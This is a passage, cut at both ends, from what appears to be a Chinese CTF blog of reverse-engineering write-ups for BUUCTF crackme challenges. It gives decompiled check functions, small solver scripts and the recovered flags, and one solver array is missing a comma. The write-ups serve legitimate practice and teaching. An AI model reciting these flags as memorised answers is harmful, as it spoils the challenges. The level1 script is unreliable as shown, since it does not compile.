-= <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            a[i] -= <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,a[i]);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{do_not_hate_me}</p></blockquote><h1 id="JustRE"><a href="#JustRE" class="headerlink" title="JustRE"></a>JustRE</h1><p><a href="https://buuoj.cn/challenges#[BJDCTF2020]JustRE">题目链接</a><br>ida32打开</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL __stdcall <span class="title">DialogFunc</span><span class="params">(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  CHAR String; <span class="comment">// [esp+0h] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">272</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">273</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a3 != <span class="number">1</span> &amp;&amp; a3 != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sprintf</span>(&amp;String, aD, ++dword_4099F0);</span><br><span class="line">      <span class="keyword">if</span> ( dword_4099F0 == <span class="number">19999</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sprintf</span>(&amp;String, aBjdDD2069a4579, <span class="number">19999</span>, <span class="number">0</span>);</span><br><span class="line">        SetWindowTextA(hWnd, &amp;String);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      SetWindowTextA(hWnd, &amp;String);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    EndDialog(hWnd, a3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第14行，我把那两个数直接带进去，就对了。</p><blockquote><p>flag{1999902069a45792d233ac}</p></blockquote><h1 id="rome"><a href="#rome" class="headerlink" title="rome"></a>rome</h1><p><a href="https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]rome">题目链接</a><br>ida32打开</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+18h] [ebp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+20h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v5; <span class="comment">// [esp+24h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v6; <span class="comment">// [esp+25h] [ebp-33h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v7; <span class="comment">// [esp+26h] [ebp-32h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v8; <span class="comment">// [esp+27h] [ebp-31h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v9; <span class="comment">// [esp+28h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+29h] [ebp-2Fh]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [esp+2Dh] [ebp-2Bh]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [esp+31h] [ebp-27h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [esp+35h] [ebp-23h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [esp+39h] [ebp-1Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [esp+3Bh] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [esp+3Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [esp+3Dh] [ebp-1Bh]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [esp+3Eh] [ebp-1Ah]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [esp+3Fh] [ebp-19h]</span></span><br><span class="line">  <span class="keyword">char</span> v20; <span class="comment">// [esp+40h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// [esp+41h] [ebp-17h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [esp+42h] [ebp-16h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [esp+43h] [ebp-15h]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [esp+44h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [esp+45h] [ebp-13h]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [esp+46h] [ebp-12h]</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [esp+47h] [ebp-11h]</span></span><br><span class="line">  <span class="keyword">char</span> v28; <span class="comment">// [esp+48h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> v29; <span class="comment">// [esp+49h] [ebp-Fh]</span></span><br><span class="line">  <span class="keyword">char</span> v30; <span class="comment">// [esp+4Ah] [ebp-Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v31; <span class="comment">// [esp+4Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v15 = <span class="number">81</span>;</span><br><span class="line">  v16 = <span class="number">115</span>;</span><br><span class="line">  v17 = <span class="number">119</span>;</span><br><span class="line">  v18 = <span class="number">51</span>;</span><br><span class="line">  v19 = <span class="number">115</span>;</span><br><span class="line">  v20 = <span class="number">106</span>;</span><br><span class="line">  v21 = <span class="number">95</span>;</span><br><span class="line">  v22 = <span class="number">108</span>;</span><br><span class="line">  v23 = <span class="number">122</span>;</span><br><span class="line">  v24 = <span class="number">52</span>;</span><br><span class="line">  v25 = <span class="number">95</span>;</span><br><span class="line">  v26 = <span class="number">85</span>;</span><br><span class="line">  v27 = <span class="number">106</span>;</span><br><span class="line">  v28 = <span class="number">119</span>;</span><br><span class="line">  v29 = <span class="number">64</span>;</span><br><span class="line">  v30 = <span class="number">108</span>;</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v5);</span><br><span class="line">  result = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v6;</span><br><span class="line">    <span class="keyword">if</span> ( v6 == <span class="string">&#x27;C&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = v7;</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="string">&#x27;T&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v8;</span><br><span class="line">        <span class="keyword">if</span> ( v8 == <span class="string">&#x27;F&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = v9;</span><br><span class="line">          <span class="keyword">if</span> ( v9 == <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = v14;</span><br><span class="line">            <span class="keyword">if</span> ( v14 == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v1 = v10;</span><br><span class="line">              v2 = v11;</span><br><span class="line">              v3 = v12;</span><br><span class="line">              v4 = v13;</span><br><span class="line">              <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( *(&amp;v1 + i) &gt; <span class="number">64</span> &amp;&amp; *(&amp;v1 + i) &lt;= <span class="number">90</span> )</span><br><span class="line">                  *(&amp;v1 + i) = (*(&amp;v1 + i) - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">                <span class="keyword">if</span> ( *(&amp;v1 + i) &gt; <span class="number">96</span> &amp;&amp; *(&amp;v1 + i) &lt;= <span class="number">122</span> )</span><br><span class="line">                  *(&amp;v1 + i) = (*(&amp;v1 + i) - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">              &#123;</span><br><span class="line">                result = *(&amp;v15 + i);</span><br><span class="line">                <span class="keyword">if</span> ( *(&amp;v1 + i) != result )</span><br><span class="line">                  <span class="keyword">return</span> result;</span><br><span class="line">              &#125;</span><br><span class="line">              result = <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是你输入16个字符，经过变化和v15-v30比较，直接爆破。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> check[<span class="number">16</span>]=&#123;<span class="number">81</span>,<span class="number">115</span>,<span class="number">119</span>,<span class="number">51</span>,<span class="number">115</span>,<span class="number">106</span>,<span class="number">95</span>,<span class="number">108</span>,<span class="number">122</span>,<span class="number">52</span>,<span class="number">95</span>,<span class="number">85</span>,<span class="number">106</span>,<span class="number">119</span>,<span class="number">64</span>,<span class="number">108</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i,j,k;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">127</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">        k=j;</span><br><span class="line">            <span class="keyword">if</span> ( j &gt; <span class="number">64</span> &amp;&amp; j &lt;= <span class="number">90</span> )</span><br><span class="line">                j = (j - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">            <span class="keyword">if</span> ( j &gt; <span class="number">96</span> &amp;&amp; j &lt;= <span class="number">122</span> )</span><br><span class="line">                j = (j - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">            <span class="keyword">if</span>(j==check[i])</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,k);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{Cae3ar_th4_Gre@t}</p></blockquote><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><p><a href="https://buuoj.cn/challenges#[GUET-CTF2019]re">题目链接</a><br>文件包有upx壳，脱掉。<br>进入main函数，然后跳至sub_4009AE，a1为flag，算出来就行，第七位没有，手动爆破。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_4009AE</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">1629056</span> * *a1 != <span class="number">166163712</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6771600</span> * a1[<span class="number">1</span>] != <span class="number">731332800</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3682944</span> * a1[<span class="number">2</span>] != <span class="number">357245568</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10431000</span> * a1[<span class="number">3</span>] != <span class="number">1074393000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3977328</span> * a1[<span class="number">4</span>] != <span class="number">489211344</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5138336</span> * a1[<span class="number">5</span>] != <span class="number">518971936</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7532250</span> * a1[<span class="number">7</span>] != <span class="number">406741500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5551632</span> * a1[<span class="number">8</span>] != <span class="number">294236496</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3409728</span> * a1[<span class="number">9</span>] != <span class="number">177305856</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">13013670</span> * a1[<span class="number">10</span>] != <span class="number">650683500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6088797</span> * a1[<span class="number">11</span>] != <span class="number">298351053</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7884663</span> * a1[<span class="number">12</span>] != <span class="number">386348487</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8944053</span> * a1[<span class="number">13</span>] != <span class="number">438258597</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5198490</span> * a1[<span class="number">14</span>] != <span class="number">249527520</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4544518</span> * a1[<span class="number">15</span>] != <span class="number">445362764</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3645600</span> * a1[<span class="number">17</span>] != <span class="number">174988800</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10115280</span> * a1[<span class="number">16</span>] != <span class="number">981182160</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">9667504</span> * a1[<span class="number">18</span>] != <span class="number">493042704</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5364450</span> * a1[<span class="number">19</span>] != <span class="number">257493600</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">13464540</span> * a1[<span class="number">20</span>] != <span class="number">767478780</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5488432</span> * a1[<span class="number">21</span>] != <span class="number">312840624</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">14479500</span> * a1[<span class="number">22</span>] != <span class="number">1404511500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6451830</span> * a1[<span class="number">23</span>] != <span class="number">316139670</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6252576</span> * a1[<span class="number">24</span>] != <span class="number">619005024</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7763364</span> * a1[<span class="number">25</span>] != <span class="number">372641472</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7327320</span> * a1[<span class="number">26</span>] != <span class="number">373693320</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8741520</span> * a1[<span class="number">27</span>] != <span class="number">498266640</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8871876</span> * a1[<span class="number">28</span>] != <span class="number">452465676</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4086720</span> * a1[<span class="number">29</span>] != <span class="number">208422720</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">9374400</span> * a1[<span class="number">30</span>] == <span class="number">515592000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">5759124</span> * a1[<span class="number">31</span>] == <span class="number">719890500</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{e165421110ba03099a1c039337}</p></blockquote><h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p><a href="https://buuoj.cn/challenges#[WUSTCTF2020]level1">题目链接</a><br>ida64打开<br>找到main函数，这里逻辑很清晰，直接上脚本。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a1[<span class="number">19</span>]=&#123;<span class="number">198</span>,<span class="number">232</span>,<span class="number">816</span>,<span class="number">200</span>,<span class="number">1536</span>,<span class="number">300</span>,<span class="number">6144</span>,<span class="number">984</span>,<span class="number">51200</span>,<span class="number">570</span>,<span class="number">92160</span>,<span class="number">1200</span>,<span class="number">565248</span>,<span class="number">756</span>,<span class="number">1474560</span>,<span class="number">800</span></span><br><span class="line">    <span class="number">6291456</span>,<span class="number">1782</span>,<span class="number">65536000</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">19</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( (i+<span class="number">1</span>) &amp; <span class="number">1</span> )</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (a1[i] &gt;&gt; (i+<span class="number">1</span>) ) );</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (a1[i]/(i+<span class="number">1</span>) ) );</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{d9-dE6-20c}</p></blockquote><h1 id="xxor"><a href="#xxor" class="headerlink" title="xxor"></a>xxor</h1><p>ida64打开<br>进入main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+40h] [rbp-30h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+48h] [rbp-28h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+50h] [rbp-20h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+60h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v16; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let us play a game?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;you have six chances to input&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Come on!&quot;</span>);</span><br><span class="line">  v6 = <span class="number">0L</span>L;</span><br><span class="line">  v7 = <span class="number">0L</span>L;</span><br><span class="line">  v8 = <span class="number">0L</span>L;</span><br><span class="line">  v9 = <span class="number">0L</span>L;</span><br><span class="line">  v10 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;input: &quot;</span>, i);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v6 + <span class="number">4</span> * i);</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = <span class="number">0L</span>L;</span><br><span class="line">  v12 